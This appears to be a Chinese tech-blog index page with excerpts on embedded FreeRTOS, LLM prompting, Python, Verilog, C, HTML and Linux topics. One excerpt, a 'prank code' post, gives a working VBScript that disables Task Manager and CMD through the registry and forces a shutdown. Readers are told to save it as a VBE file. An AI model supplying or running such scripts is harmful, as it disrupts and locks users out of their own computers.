			<a href="/posts/7727e344a6f5721ec1a00b12ea48c505/" rel="bookmark">
			STM32之FreeRTOS学习笔记——第一章 使用SysTick和普通定时器作为FreeRTOS基准时钟的比较
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
目的
一、使用CubeMX软件分别生成SysTick和普通定时器作为基准时钟的程序
二、使用BCompare软件对比2种基准时间下生成的工程代码
1.stm32f1xx_it.h文件对比
2.stm32f1xx_it.c文件对比
3.main.c文件对比
4.普通定时器为基准时钟的情况下增加stm32f1xx_hal_timebase_tim.c文件
三、总结
目的 为方便裸机HAL库程序手动移植FreeRTOS，需将裸机程序基准时钟改为其他定时器产生，现对两种基准时钟生成的代码进行比较，加快移植效率。
一、使用CubeMX软件分别生成SysTick和普通定时器作为基准时钟的程序 1、SysTick为基准时钟：
2、普通定时器为基准时钟，这里以 定时器6 为例
可以看出，使用普通定时器作为基准时钟的情况下，工程文件中多了一个“stm32f1xx_hal_timebase_tim.c”文件。
二、使用BCompare软件对比2种基准时间下生成的工程代码 对比发现有4个文件不相同，具体如下图，并对4处不同之处展开对比。
1.stm32f1xx_it.h文件对比 普通定时器的情况下进行了定时器6中断声明。
2.stm32f1xx_it.c文件对比 增加普通定时器下定时器中断函数，删除SysTick的中断计数函数。
3.main.c文件对比 普通定时器下增加定时器的回调函数。
4.普通定时器为基准时钟的情况下增加stm32f1xx_hal_timebase_tim.c文件 stm32f1xx_hal_timebase_tim.c文件内容即基准时钟的配置。
三、总结 根据以上对比，移植时主要注意两点：
1，普通定时器的情况下，增加 “stm32f1xx_hal_timebase_tim.c” 文件用于配置基准时钟；
2，增加普通定时器中断函数及计数函数，删除SysTick的计数函数。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a850e0ab670dbd5ef899c5ea6e8d7ca/" rel="bookmark">
			STM32之FreeRTOS学习笔记——第二章 手动移植
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
目的
一、FreeRTOS官网下载内核文件
二、内核移植
1.文件拷贝
2.工程配置
3.移植工程代码修改
三、移植验证
目的 为方便裸机HAL库程序手动移植FreeRTOS，加快移植效率。本文在第一章基础上进行移植（详见：https://blog.csdn.net/Huan_Xiang_Yu/article/details/127561357）。
一、FreeRTOS官网下载内核文件 官网：FreeRTOS - Market leading RTOS (Real Time Operating System) for embedded systems with Internet of Things extensionshttps://www.freertos.org/index.html
二、内核移植 将下载的FreeRTOS内核包解压，打开FreeRTOS文件夹。
1.文件拷贝 拷贝路径FreeRTOS-&gt;Source下文件到需要移植的工程下；
删除FreeRTOS-&gt;Source-&gt;portable下多余文件夹，保留 Keil，MemMang，RVDS 3个文件夹；
删除FreeRTOS-&gt;Source-&gt;portable-&gt;MemMang文件夹下多余的文件，保留“heap_4.c”;
删除FreeRTOS-&gt;Source-&gt;portable-&gt;RVDS文件夹下多余的文件夹，保留“ARM_CM3”文件夹;
拷贝FreeRTOS-&gt;Demo-&gt;CORTEX STM32F103 Keil文件夹下FreeRTOSConfig.h到工程文件夹下（根据芯片型号选择对应系列文件夹下的FreeRTOSConfig.h）。
文件拷贝后工程下FreeRTOS包含文件及文件夹如下：
2.工程配置 打开需移植的Keil工程，将FreeRTOS相关文件添加到项目工程中；
打开选项卡，配置FreeRTOS相关头文件路径。
3.移植工程代码修改 编译工程，提示报错信息（Error: L6218E: Undefined symbol xTaskGetCurrentTaskHandle (referred from stream_buffer.o).），查找发现“INCLUDE_xTaskGetCurrentTaskHandle”未定义；
在FreeRTOSConfig.h文件下，添加INCLUDE_xTaskGetCurrentTaskHandle定义。再添加FreeRTOS系统相关的3个中断处理函数如下：
#define INCLUDE_xTaskGetCurrentTaskHandle 1 #define xPortPendSVHandler PendSV_Handler #define xPortSysTickHandler SysTick_Handler #define vPortSVCHandler SVC_Handler 删除或屏蔽原工程的3个中断处理函数，以免重复重复定义。
三、移植验证 在main.c文件下直接复制正点原子任务函数进行快速验证：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3a850e0ab670dbd5ef899c5ea6e8d7ca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e27331afe597511a90332b6a5c00ce71/" rel="bookmark">
			如何使用大型语言模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如何使用大型语言模型 大型语言模型的工作原理 大型语言模型是将文本映射到文本的函数。给定一个输入文本字符串，大型语言模型会预测接下来应该出现的文本。
大型语言模型的神奇之处在于，通过训练以最大限度地减少对大量文本的预测误差，模型最终学习到对这些预测有用的概念。例如，他们学习：
怎么拼语法是如何运作的如何释义如何回答问题如何进行对话如何用多种语言写作如何编码等等。 这些能力都没有明确编入程序——它们都是训练的结果。
GPT-3 为数百种软件产品提供支持，包括生产力应用程序、教育应用程序、游戏等。
如何控制大型语言模型 在大型语言模型的所有输入中，迄今为止影响最大的是文本提示。
可以通过以下几种方式提示大型语言模型生成输出：
说明：告诉模型你想要什么完成：诱导模型完成你想要的开始演示：向模型显示您想要的内容，可以使用： 提示中的几个例子微调训练数据集中有数百或数千个示例 下面显示了每个示例。
指令提示 指令跟随模型（例如，text-davinci-003或任何以text-开头的模型）专门设计用于遵循指令。在提示的顶部（或底部，或两者）写下您的指令，模型将尽最大努力遵循指令，然后停止。说明可以很详细，所以不要害怕写一段明确详细说明您想要的输出。
示例指令提示：
从下面的引文中提取作者姓名。 “一些人认为，智能物种在能够扩展到外太空之前就已经灭绝了。 如果他们是正确的，那么夜空的寂静就是墓地的寂静。” ——Ted Chiang，《呼气》 输出:
Ted Chiang 完成提示示例 完成式提示利用大型语言模型如何尝试编写他们认为最有可能出现的文本。要引导模型，请尝试从一个模式或句子开始，该模式或句子将由您想要查看的输出完成。相对于直接指令，这种转向大型语言模型的方式可以更加小心和实验。此外，模型不一定知道在哪里停止，因此您通常需要停止序列或后处理来切断超出所需输出的生成文本。
示例完成提示：
“一些人认为，智能物种在能够扩展到外太空之前就已经灭绝了。 如果他们是正确的，那么夜空的寂静就是墓地的寂静。” ——Ted Chiang，《呼气》 这句话的作者是 输出:
Ted Chiang 演示提示示例 (小样本学习) 与完成式提示类似，演示可以向模型展示您希望它做什么。这种方法有时称为小样本学习，因为模型从提示中提供的几个示例中学习。
示例演示提示：
引用： “当推理思维被迫一次又一次地面对不可能的事情时，它别无选择，只能适应。” ― N.K. 杰米辛,第五季 作者：N.K. 杰米辛 引用： “一些人认为，智能物种在能够扩展到外太空之前就已经灭绝了。 如果他们是正确的，那么夜空的寂静就是墓地的寂静。” ——Ted Chiang，《呼气》 作者： 输出:
Ted Chiang 微调提示示例 通过足够的训练示例，您可以微调自定义模型。在这种情况下，指令变得不必要，因为模型可以从提供的训练数据中学习任务。但是，包含分隔符序列（例如，-&gt;或###或任何通常不出现在输入中的字符串）来告诉模型提示何时结束，输出何时开始，这可能会很有帮助。如果没有分隔符序列，则存在模型继续详细说明输入文本而不是从您想要看到的答案开始的风险。
微调提示示例（对于在类似的提示完成对上经过自定义训练的模型）
“一些人认为，智能物种在能够扩展到外太空之前就已经灭绝了。 如果他们是正确的，那么夜空的寂静就是墓地的寂静。” ——Ted Chiang，《呼气》 ### 输出：
Ted Chiang 代码能力 大型语言模型不仅擅长文本——它们也擅长代码。OpenAI 的专用代码模型称为Codex。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e27331afe597511a90332b6a5c00ce71/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1201fb262d254bdcb24cce1196df2070/" rel="bookmark">
			Domain Generalization | 域适应、域泛化、OOD、开放集问题定义
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在实际场景中，训练集和测试集往往存在分布差异，导致模型不work。领域自适应是解决这类问题的一种方法，但是它需要测试数据的一些先验知识。但是很多时候，在测试数据到来前我们往往对它们是一无所知的，因此近年来很多人开始考虑一种更有实际意义的研究场景，也就是领域泛化。
下面我们先就来梳理一下领域自适应（Domain Adaptation, DA），领域泛化（Domain Generalization, DG），分布外泛化（Out-of-Distribution Generalization, OODG）,分布外检测（Out-of-Distribution Detection, OODD），开放集（Open Set, OS）这几个概念的定义。
在迁移学习中，我们通常称训练模型的数据集，即训练集，为源域，称模型在应用时遇到的数据，即测试集，为目标域。
领域自适应 领域泛化 DG的分布差异类型和DA完全一样，也是源域和目标域存在Domain Shift。DG与DA的最大区别是：在模型训练集阶段，DG没有目标域的任何先验信息，通俗来说就是DA在训练时可以拿到少量目标域数据，这些目标域数据可能是有标签的（有监督DA），也可能是无标签的（无监督DA），但是DG在训练时看不到目标域数据。
现在对DG的研究主要分为单源域DG和多源域DG，一般定义多源域DG每个源域内部的数据是同分布的。
现有的很多DG方法都是仅利用源域的特征信息进行模型学习。
分布外泛化 开放集域适应
转载于：
Domain Generalization | 域适应、域泛化、OOD、开放集问题定义
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7549f376725c44455670b30646ed74ce/" rel="bookmark">
			ChatGPT微调分类示例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们将微调 ada 分类器以区分两种运动：棒球和曲棍球。
from sklearn.datasets import fetch_20newsgroups import pandas as pd import openai categories = ['rec.sport.baseball', 'rec.sport.hockey'] sports_dataset = fetch_20newsgroups(subset='train', shuffle=True, random_state=42, categories=categories) 数据探索 可以使用 sklearn 加载新闻组数据集。 首先，我们将查看数据本身：
print(sports_dataset['data'][0]) From: dougb@comm.mot.com (Doug Bank) Subject: Re: Info needed for Cleveland tickets Reply-To: dougb@ecs.comm.mot.com Organization: Motorola Land Mobile Products Sector Distribution: usa Nntp-Posting-Host: 145.1.146.35 Lines: 17 In article &lt;1993Apr1.234031.4950@leland.Stanford.EDU&gt;, bohnert@leland.Stanford.EDU (matthew bohnert) writes: |&gt; I'm going to be in Cleveland Thursday, April 15 to Sunday, April 18.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7549f376725c44455670b30646ed74ce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0dca6b7b3708083a80fc8464ca1b7ef4/" rel="bookmark">
			python操作word表格，并修改表格内容
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.安装win32com.client库
pip install pywin32 2.导包
import win32com.client 3.总代码
import os import win32com.client # 创建 Word 应用程序对象 word = win32com.client.Dispatch("Word.Application") #要操作的文件路径 file='D:\桌面\\1.doc' #打开文件 doc = word.Documents.Open(file) # 获取文档中的所有表格 tables = doc.Tables # 获取要操作的表格对象(从0开始，0为第一个表格，注意表格是否跨页分开，是否同一个表格) table = tables[0] #确定修改表格(x,y),x为行，y为列，都从1开始 cell = table.Cell(1, 1) #第一行第二列 cell.Range.Text = '修改为的内容' # 关闭 Word 文档并保存更改 doc.Close(SaveChanges=True) # 关闭 Word 应用程序对象 word.Quit() #自动打开word文件 os.startfile(file) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3fcb3503b8e925303d6db295d60fa039/" rel="bookmark">
			【FPGA实验4】举重比赛机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		举重比赛有三名裁判，当运动员将杠铃举起后，须有两名或两名以上裁判认可，方可判定试举成功，若用A、B、C分别代表三名裁判的意见输入，同意为1，否定为0;F为裁判结果输出，试举成功时F=1，试举失败时F=0。
一、分析与Verilog代码 真值表： ABCF00000010010001111000101111011111 因而可以得到 F = (A&amp;&amp;B) || (A&amp;&amp;C) ||(B&amp;&amp;C)
Verilog代码： module test( input wire A, input wire B, input wire C, output wire F); reg result=0; always @(A,B,C) result = (A&amp;&amp;B) || (A&amp;&amp;C) ||(B&amp;&amp;C); assign F = result; endmodule 二、软件仿真 tb文件： module test_tb(); wire result; reg [3:0] count; reg A, B, C; reg clk; always #5 clk=~clk; initial begin clk&lt;=0; A&lt;=0; B&lt;=1; C&lt;=1; count&lt;=1'b0; end always @ (posedge clk) begin if (count == 4'd2) begin A&lt;=~A; end else if(count ==4'd4)begin B&lt;=~B; end else begin C=~C; end if (count==4'd4)begin count&lt;=4'b0; end else begin count&lt;=count+1'b1; end end test u_test( .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3fcb3503b8e925303d6db295d60fa039/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bdda5fb9d7bf08cfc0122538ef19a943/" rel="bookmark">
			ZZULIOJ 1032: 员工薪水 (C/C&#43;&#43;)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1032: 员工薪水 题目描述
某公司规定，销售人员工资由基本工资和销售提成两部分组成，其中基本工资是1500元/月，销售提成规则如下：
销售额小于等于10000元时，按照5%提成；
销售额大于10000元但小于等于50000元时，超出10000部分按照3%提成；
销售额大于50000元时，超出50000部分按照2%提成。
编写程序，根据销售额计算员工收入。
输入
输入一个整数表示销售额
输出
输出员工的薪水，保留2位小数。
样例输入 Copy
30000
样例输出 Copy
2600.00
代码
#include&lt;stdio.h&gt; int main() { int s; double sum; scanf("%d",&amp;s); if(s&lt;=10000) sum=1500+s*0.05; if(s&gt;10000&amp;&amp;s&lt;=50000) sum=1500+10000*0.05+(s-10000)*0.03; if(s&gt;50000) sum=1500+10000*0.05+40000*0.03+(s-50000)*0.02; printf("%.2lf",sum); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/633cf125862d43c4a195a3d0471df10c/" rel="bookmark">
			windows11文件夹打开慢怎么办 windows11文件夹打开慢解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		windows11在更新后有的用户发现自己原本在win10上很快就可以开启的文件夹在这个新的系统中打开得特别慢，因此非常麻烦，windows11文件夹打开慢怎么办已经成了许多用户非常伤脑筋的问题，那么该怎么解决呢，此处就给用户们带来了最新的windows11文件夹打开慢解决方法，用户按照该设置就可以解决这个问题了。
windows11文件夹打开慢怎么办
1.首先我们可以按win+r键打开运行窗口，然后输入命令”regedit"回车确认。
2.进入到注册表编辑器当中，依次打开“计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions”。
3.然后我们点击Shell Extensions 右键新建“项”。
4.将其命名为“Blocked：，接着右键 Blocked ，新建”字符串值“。
5.然后将其命名为{e2bf9676-5f8f-435c-97eb-11607a5bedf7}。
6.最后重启资源管理器，就可以发现资源管理器的样式变成Win10的样式了，使用起来非常流畅。
7.如果想要返回之前的状态，删除 Blocked 并重启资源管理器即可。
上述就是windows11文件夹打开慢怎么办的解决方法了，希望用户们可以解决打开文件夹慢的问题哦。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ffd9e5fdb72a66376bee17f0e4f1cb78/" rel="bookmark">
			区块链 -＞ 区块链简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 区块链结合去中心化后组成的数据库有什么特点?区块链能干什么? 区块链实际是一种数据库。
不同于我们的MySQL数据库,区块链是一种分布式数据库。 腾讯:Tencent Distributed SQL，简称 TDSQL。阿里:PolarDB PostgreSQL，简称PolarDB-PG。 区块链还有一个特点 -&gt; 去中心化。
所以区块链是一个去中心化的分布式数据库 下面我们将说说
区块链结合去中心化后组成的数据库有什么特点?区块链能干什么? 区块链结合去中心化后组成的数据库有什么特点? 去中心化是指在一个系统中去除中心化调度或控制模式的方式。
在传统的系统中，都有一个绝对核心的节点或者程序控制着这个系统，只要他不答应，你就别想继续。
有一个人或者组织，对这个系统有着一票否决权，它就是这个系统的皇帝，必须通过它的肯定才可以执行完成。 去中心化的概论就是废除这个皇帝，废除这个核心的程序。
参与的人都有股份，并且没有任何人有一票否决权。 当一个人请求一件事情的时候，传统的系统中，必须得到核心程序的肯定之后才可以放行，去中心化废除了这个核心。
取而代之的是，这个系统的所有参与人/股东都可以对他的请求进行回答，一旦这个系统超过一半的股东同意这件事，那么就可以完成执行这一次请求，不存在被某个人、某个组织掌控。 去中心化是一种最为先进的计算方式，但是在现实生活中却是常见的。
它是更加民主、平等的新型交互模式。并且，一旦有一个节点/股东同意了这个请求,那么他就会在他的信息中记录这件事，这就表明每一个参与的成员都有一份备份数据。 只要还有任何一个节点/股东活着，数据就不会丢失，数据及其安全。
数据一旦生成，便被所有节点复制备份，如果你想篡改你的这条数据，也只会新增一条修改过的记录，那种偷偷改账本的情况在去中心化的系统中已经不可能存在了，世界上像这样的账本有无数本。
保证了数据的安全性和不可篡改性。 数据都会被加密，你请求的数据会被你的密码加密，尽管别人备份了，他也是看不懂的。
尽管每个节点都有备份你的数据，但也有别人的数据，数据都是加密的，看不懂的乱码，这个去中心化的系统中参与的人越多，看不懂的数据就会越多，别人想找到你的数据并且解密你的数据就难如登天。
保证了数据保密性。 区块链是一种利用去中心化技术实现信息交换和存储的全新模式，它记录了一系列经过验证的交易数据，并以区块的形式建立了永久可信的数据存储空间。
区块链能干什么? 从上面的说明我们能知道，一些对过程很重要的事项，区块链都有极大的优势。
金融: 每一条数据都不可篡改、保密、不会因为系统崩溃丢失数据。 这样的优势特别适合金融行业，我们需要对每一个数据修改都有记录，不会被私人改变。你的钱不会因为银行数据库被炸了就丢失，除非世界上所有的银行和分行都被炸了。 数据存储和共享: 很遗憾你都要交出你的身份信息和手机号码,导致个人信息泄露。 使用区块链存储个人信息,他们只有你的加密过的信息数据,你的信息不会被泄露 很遗憾，大家的个人信息已经无了。 一切数据都存在区块链，企业信息还是什么信息，都会极其的安全。 不会丢失、不会泄密、不会被敌人篡改。 物联网中的应用：区块链技术可以为物联网应用程序提供安全数据存储和安全的交易验证。 每一个物联网设备中都有你想要的数据，不必再调用中心服务器去查询数据。 身边有一台物联网设备，不管是谁生产的，只要是同一个区块链上都可以交换数据，快。 区块链将是数据的天堂
在未来，数据都将来自区块链，而不是某个人某个组织自己安装数据库存储。自己安装不怕数据库崩溃吗?不怕数据库被黑客攻击吗?不怕硬盘坏吗? 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7d25e667f7b41b4a1cb1f16e358b08b8/" rel="bookmark">
			十、CNN卷积神经网络实战
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、确定输入样本特征和输出特征 输入样本通道数4、期待输出样本通道数2、卷积核大小3×3
具体卷积层的构建可参考博文：八、卷积层
设定卷积层
torch.nn.Conv2d(in_channels=in_channel,out_channels=out_channel,kernel_size=kernel_size,padding=1,stride=1)
必要参数：输入样本通道数in_channels、输出样本通道数out_channels、卷积核大小kernel_size
padding是否加边，默认不加，这里为了保证输出图像的大小不变，加边数设为1
stride步长设置，默认为1
import torch in_channel, out_channel = 4, 2 width, heigh = 512, 512 batch_size = 1 inputs = torch.randn(batch_size,in_channels,width,heigh)#[B,C,W,H] kernel_size = 3 conv_layer = torch.nn.Conv2d(in_channels=in_channel,out_channels=out_channel,kernel_size=kernel_size,padding=1,stride=1) outputs = conv_layer(inputs) print(inputs.shape) """ torch.Size([1, 4, 512, 512]) """ print(outputs.shape) """ torch.Size([1, 2, 512, 512]) """ print(conv_layer.weight.shape)#看下卷积层核参数信息 # 卷积层权重参数大小，因为batch_size为1，故卷积核参数的B也为1； # 因为输入样本的通道数是3，故卷积层传入参数的channel也为3； # 因为输出样本的通道数是1，故卷积层传入参数的 """ torch.Size([2, 4, 3, 3]) """ 二、确定卷积核内容进行卷积 import torch inputs = [1,1,1,1,1, 2,2,2,2,2, 1,1,2,1,1, 1,1,2,1,1, 1,1,2,1,1] inputs = torch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7d25e667f7b41b4a1cb1f16e358b08b8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0bbdec34011766a77ba3b3d57d161f8e/" rel="bookmark">
			vbs整人代码大全(强制自动关机,打开无数计算器)等.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、
set s=createobject("wscript.shell") set bag=getobject("winmgmts:\\.\root\cimv2") set pipe=bag.execquery("select * from win32_process where name='wscript.exe'") For Each id in pipe if instr(1,id.commandLine,wscript.scriptfullname)&lt;&gt;0 and pipe.count&gt;=2 then s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr",0,"REG_DWORD" s.regwrite"HKCU\Software\Policies\Microsoft\Windows\System\DisableCMD",0,"REG_DWORD" id.terminate() else s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr",1,"REG_DWORD" s.regwrite"HKCU\Software\Policies\Microsoft\Windows\System\DisableCMD",1,"REG_DWORD" for i=1 to 60 s.popup"系统将在"&amp; 60-i &amp;"秒后关机...",1,"系统提示",4096+48 next Set colOS = GetObject("winmgmts:{(Shutdown)}").ExecQuery("Select * FROM Win32_OperatingSystem") For Each eOs In colOS eOs.Win32Shutdown(2) Next end if Next 复制以上代码，在桌面建一个文本，把代码放进去，另存为VBE格式，
此代码的威力：
1：开机就强制自动关机
2：cmd命令打不开
3：结束任务不管用
4：F8安全模式也不管用
呵呵！听起来是不是有点恐怖啊，我在我朋友空间里看见也吓了一跳、
代码破解方法：就是再运行一次，就可以破解了，也就是第2次保存的那个VBE文件，，
PS：不要乱拿软件去整人，发生什么事可不要怪我啊。。
二、
on error resume next dim WSHshellA set WSHshellA = wscript.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0bbdec34011766a77ba3b3d57d161f8e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae71365e5a3029be03440919487222b6/" rel="bookmark">
			【c语言】二维数组与指针 存储原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		创作不易，本篇文章如果帮助到了你，还请点赞支持一下♡&gt;𖥦&lt;)!! 主页专栏有更多知识，如有疑问欢迎大家指正讨论，共同进步！
给大家跳段街舞感谢支持！ጿ ኈ ቼ ዽ ጿ ኈ ቼ ዽ ጿ ኈ ቼ ዽ ጿ ኈ ቼ ዽ ጿ ኈ ቼ 目录
一些前导知识： 一、二维数组在内存中的存储形态 二、二维数组名 地址常量用法
1）找到 某行的首地址
2）得到 某行的存储空间
3）找到某行内--某列的地址
4）得到某行 某列的存储空间
三、&amp;arr取整个二维数组的地址
四、数组指针在二维数组的用法
1）利用指向一维数组的指针 遍历每一行的首地址
2）利用指向一维数组的指针 遍历每一行 每一个元素成员
3）利用指向二维数组的指针 遍历每一行 每一个元素成员
一些前导知识： 利用指针变量操作数组
指针数组、数组指针
二维数组 一、二维数组在内存中的存储形态 我们先定义一个二维数组（以一维 串的形式）
int arr[3][4] = { 1,2,3,4,5,6,7,8,9,10,11,12 }; 为什么二维数组可以这样定义呢？二维数组不是平面 表格形式的吗？
原因是二维数组在内存中的存储形式是连续的。内存中并没有“表格”。
我们可以用int指针遍历数组元素，证明二维数组在内存中是连续的： #include &lt;stdio.h&gt; int main() { /* 二维数组在内存中的存储形态 */ int arr[3][4] = { 1,2,3,4,5,6,7,8,9,10,11,12 }; int* p = &amp;arr[0][0]; for (int i = 0; i &lt; 3 * 4; i++) { printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae71365e5a3029be03440919487222b6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/609db2de42501f908df1c7bb39e42b24/" rel="bookmark">
			cJSON数组demo
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		int cJSON_array_demo_1(void) { cJSON *student = NULL;	cJSON *class = cJSON_CreateObject(); if (NULL == class) { return -1; } cJSON_AddNumberToObject(class, "studentCnt", 2); cJSON *studentsArr = cJSON_CreateArray(); student = cJSON_CreateObject(); cJSON_AddNumberToObject(student, "number", 1); cJSON_AddStringToObject(student, "name", "xiaoming"); cJSON_AddItemToArray(studentsArr, student); student = cJSON_CreateObject(); cJSON_AddNumberToObject(student, "number", 2); cJSON_AddStringToObject(student, "name", "xiaohong"); cJSON_AddItemToArray(studentsArr, student); cJSON_AddItemToObject(class, "students", studentsArr); char *strJson = cJSON_Print(class); printf("\n%s\n", strJson); cJSON_Delete(class); free(strJson); } /* { "studentCnt":	2, "students":	[{ "number":	1, "name":	"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/609db2de42501f908df1c7bb39e42b24/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e95a3da28d440375e52ba967a1f811e/" rel="bookmark">
			html页面布局
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.HTML页面布局 1.1 什么是html页面布局？ HTML页面布局是指在网页中安排和组织内容的方式。它涉及到如何放置页面元素（例如文字、图片、视频等），以及如何确定它们之间的关系和空间。HTML页面布局是Web开发中非常重要的一部分，因为它可以影响用户对网站的使用和体验。
通过HTML页面布局，开发人员可以创建易于导航和浏览的页面，并使其具有适当的结构和外观，以达到最佳的用户体验效果。页面布局可以包括基本的网格系统、栅格布局、定位布局、框架布局等多种方法，每种方法都有其独特的优缺点和适用场景。
1.2 html样式举例 下面的图片就是在网页中的布局：
二.实现方法 2.1 常用方法 HTML页面布局可以使用多种方法，以下是其中一些常用的方法：
使用HTML表格：可以使用HTML表格来创建网页布局。表格可以被分成行和列，每个单元格可以包含文本、图像或其他元素。
使用CSS布局：可以使用CSS来控制网页中每个元素的位置和大小。通过设置元素的样式属性，可以将它们放置在网页上的任何位置，并调整它们的大小和形状。
使用CSS定位：CSS定位可以让开发者更加精确地控制元素的位置和大小。使用CSS定位可以将一个元素放置在网页上的任何位置，并且可以让它悬浮在其它元素之上。
使用HTML框架：可以使用HTML框架来创建复杂的网页布局。框架可以将网页拆分成多个区域，并使这些区域可以独立滚动。
以上仅是几种常见的布局方法，实际上还有很多其他的方法可以用于创建网页布局，具体取决于开发者的需求和技术水平。
2.2 实验方法 大多数网站可以使用 &lt;div&gt; 或者 &lt;table&gt; 元素来创建多列。CSS 用于对元素进行定位，或者为页面创建背景以及色彩丰富的外观。
本次练习暂时不接触CSS，主要通过 &lt;div&gt; 和 &lt;table&gt; 来实现页面布局。
三.题目要求 3.1 题目 使用 &lt;div&gt; 和 &lt;table&gt;标签来简单实现页面的布局。
3.2 补充说明 &lt;table&gt;标签虽然也可以用来实现页面布局，但它本来的作用是实现页面的表格，它不是布局工具。
四.源代码 4.1 &lt;div&gt; 标签实现 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;终究还是散了&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;front align="center"&gt; &lt;div id="container" style="width:500px"&gt; &lt;div id="header" style="background-color:#FFA500;"&gt; &lt;h1 style="margin-bottom:0;"&gt;div页面布局&lt;/h1&gt;&lt;/div&gt; &lt;div id="menu" style="background-color:#FFD700;height:200px;width:100px;float:left;"&gt; &lt;b&gt;前端工具&lt;/b&gt;&lt;br&gt; HTML&lt;br&gt; CSS&lt;br&gt; JavaScript&lt;/div&gt; &lt;div id="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e95a3da28d440375e52ba967a1f811e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3679b8bf1d3c4b6c7a00d030eb2fd3b/" rel="bookmark">
			Linux常用命令详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1. cd：切换当前工作目录
2. ls：查看当前目录下的文件和目录
3. mkdir：创建新的目录
4. rmdir：删除一个空的目录
5. touch：创建空文件或更新文件时间戳
6. cat：查看文件内容
7. cp：复制文件或目录
8. mv：移动或重命名文件或目录
9. rm：删除文件或目录
10. chmod：修改文件或目录的权限
11. chown：修改文件或目录的所有者
12. ps：查看当前进程状态
13. kill：终止进程
14. top：动态查看系统资源占用情况
15. df：查看磁盘空间使用情况
16. free：查看内存空闲情况
17. tar：压缩或解压文件或目录
18. grep：搜索文件中的指定内容
19. ping：测试网络连通性
20. ifconfig：查看网络配置信息
有关更多详细信息，请访问：www.tsyvps.com 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f21ed10287b25b9df256e8be6664e064/" rel="bookmark">
			Python 导入csv数据的三种方法分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇文章主要介绍了Python 中导入csv数据的三种方法,内容比较简单，非常不错，具有一定的参考借鉴价值，需要的朋友可以参考下微点阅读小编收集的文章介绍。
Python 中导入csv数据的三种方法，具体内容如下所示：
1、通过标准的Python库导入CSV文件：
Python提供了一个标准的类库CSV文件。这个类库中的reader()函数用来导入CSV文件。当CSV文件被读入后，可以利用这些数据生成一个NumPy数组，用来训练算法模型。：
1
2
3
4
5
6
7
8
9
from csv importreader
import numpy as np
filename=input("请输入文件名： ")
withopen(filename,'rt',encoding='UTF-8')as raw_data:
